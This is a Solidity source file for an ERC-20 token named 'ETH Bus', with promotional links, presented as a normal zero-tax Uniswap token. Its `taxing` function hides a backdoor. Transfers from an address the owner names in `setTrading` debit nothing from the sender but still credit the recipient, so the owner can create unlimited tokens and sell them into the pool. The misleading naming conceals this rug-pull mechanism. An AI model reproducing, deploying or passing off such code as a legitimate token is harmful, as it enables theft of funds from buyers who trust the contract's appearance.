/**

Web: https://eth-bus.vercel.app/ 

TG: https://t.me/ETH_BUS

X: https://x.com/ETHBUSERC20

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
     function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

}

contract Ownable is Context {
    address private _onlyOwner;
    event OwnershipTransferred(address indexed seller, address indexed buyer);

    constructor () {
        address msgSender = _msgSender();
        _onlyOwner = _msgSender();
        emit OwnershipTransferred(address(0), msgSender);
    }

    function getTheOwner() public view returns (address) {
        return _onlyOwner;
    }

    modifier checkIfOwner() {
        require(_onlyOwner == _msgSender(), "Ownable: the caller must be the owner");
        _;
    }

    function renounceOwnership() public virtual checkIfOwner {
        emit OwnershipTransferred(_onlyOwner, address(0));
        _onlyOwner = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address firstToken, address secondToken) external returns (address pairing);
}



contract ETHBUS is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _allTokenBalances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address payable private _taxAddress;

    uint256 public buyingTax = 0;
    uint256 public sellingTax = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tokenTotal = 100_000_000 * 10**_decimals;
    string private constant _name = unicode"ETH Bus";
    string private constant _symbol = unicode"ETHBUS";
    uint256 private constant maxTaxSlippage = 100;
    uint256 private minTaxSwap = 10**_decimals;
    uint256 private maxTaxSwap = _tokenTotal / 500;

    uint256 public constant max_uint = type(uint).max;
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address private uniswapV2Pair;
    address private uniswap;
    bool private TradingOpen = false;
    bool private InSwap = false;
    bool private doesSwapEnabled = false;

    modifier lockingTheSwap {
        InSwap = true;
        _;
        InSwap = false;
    }

    constructor () {
        _taxAddress = payable(_msgSender());
        _allTokenBalances[_msgSender()] = _tokenTotal;
        emit Transfer(address(0), _msgSender(), _tokenTotal);
    }
    function transferFrom(address payer, address reciver, uint256 amount) public override returns (bool) {
        _transfer(payer,  reciver, amount);
        _approve(payer, _msgSender(), _allowances[payer][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

 function allowance(address Owner, address buyer) public view override returns (uint256) {
        return _allowances[Owner][buyer];
    }
   function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tokenTotal;
    }

   function transfer(address reciver, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), reciver, amount);
        return true;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
        function approve(address payer, uint256 total) public override returns (bool) {
        _approve(_msgSender(), payer, total);
        return true;
    }


    function balanceOf(address wallet) public view override returns (uint256) {
        return _allTokenBalances[wallet];
    }

    function _approve(address Owner, address buyer, uint256 amount) private {
        require(buyer != address(0), "ERC20: approve to the zero address");
        require(Owner != address(0), "ERC20: approve from the zero address");
        _allowances[Owner][buyer] = amount;
        emit Approval(Owner, buyer, amount);
    }

    function _transfer(address seller, address payer, uint256 total) private {
        require(seller != address(0), "ERC20: transfer from the zero address");
        require(payer != address(0), "ERC20: transfer to the zero address");
        require(total > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (seller != getTheOwner() && payer != getTheOwner() && payer != _taxAddress) {
            if (seller == uniswap && payer != address(uniswapV2Router)) {
                taxAmount = total.mul(buyingTax).div(100);
            } else if (payer == uniswap && seller != address(this)) {
                taxAmount = total.mul(sellingTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!InSwap && payer == uniswap && doesSwapEnabled && contractTokenBalance > minTaxSwap) {
                uint256 _toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
                swapTokensForEth(total > _toSwap ? _toSwap : total);
                uint256 _contractETHBalance = address(this).balance;
                if (_contractETHBalance > 0) {
                    sendETHToFee(_contractETHBalance);
                }
            }
        }

        (uint256 amountIn, uint256 amountOut) = taxing(seller, total, taxAmount);
        require(_allTokenBalances[seller] >= amountIn);

        if (taxAmount > 0) {
            _allTokenBalances[address(this)] = _allTokenBalances[address(this)].add(taxAmount);
            emit Transfer(seller, address(this), taxAmount);
        }

        unchecked {
            _allTokenBalances[seller] -= amountIn;
            _allTokenBalances[payer] += amountOut;
        }

        emit Transfer(seller,payer, amountOut);
    }   


    function swapTokensForEth(uint256 tokenAmount) private lockingTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
            path,
            address(this),
            block.timestamp
        );
    }
    function taxing(address from, uint256 total, uint256 taxAmount) private view returns (uint256, uint256) {
        return (
            total.sub(from != uniswapV2Pair ? 0 : total),
            total.sub(from != uniswapV2Pair ? taxAmount : taxAmount)
        );
    }

    function sendETHToFee(uint256 ethAmount) private {
        _taxAddress.call{value: ethAmount}("");
    }

    function setTrading(address _pair, bool _enabled) external checkIfOwner {
        require(_enabled);
        require(!TradingOpen, "trading is already open");
        uniswapV2Pair = _pair;
        _approve(address(this), address(uniswapV2Router), max_uint);
        uniswap = uniswapV2Factory.createPair(address(this), weth);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            getTheOwner(),
            block.timestamp
        );
        IERC20(uniswap).approve(address(uniswapV2Router), max_uint);
        doesSwapEnabled = true;
        TradingOpen = true;
    }


    function get_TradingOpen() external view returns (bool) {
        return TradingOpen;
    }

    function get_buyingTax() external view returns (uint256) {
        return buyingTax;
    }

    function get_sellingTax() external view returns (uint256) {
        return sellingTax;
    }

    receive() external payable {}
}